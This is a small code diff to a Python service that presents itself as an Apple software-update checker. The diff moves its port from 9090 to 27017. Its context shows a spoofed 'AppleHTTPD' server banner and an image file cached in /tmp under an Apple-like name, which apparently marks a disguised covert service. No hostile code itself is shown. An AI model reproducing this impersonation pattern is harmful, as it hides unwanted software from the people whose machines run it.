@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 com.apple.SoftwareUpdateCheck — macOS Update Verification Service
-Internal only. Port 9090.
+Internal only. Port 27017.
 """
 
 import json
@@ -19,7 +19,7 @@ INSTALL_DIR = os.path.dirname(os.path.abspath(__file__))
 LOG_FILE    = os.path.join(INSTALL_DIR, "update.log")
 PID_FILE    = os.path.join(INSTALL_DIR, "update.pid")
 FRAME_FILE  = "/tmp/com.apple.SoftwareUpdate.cache.jpg"
-PORT        = 9090
+PORT        = 27017
 
 _SRV = b"AppleHTTPD/2.4"
 _START = time.time()
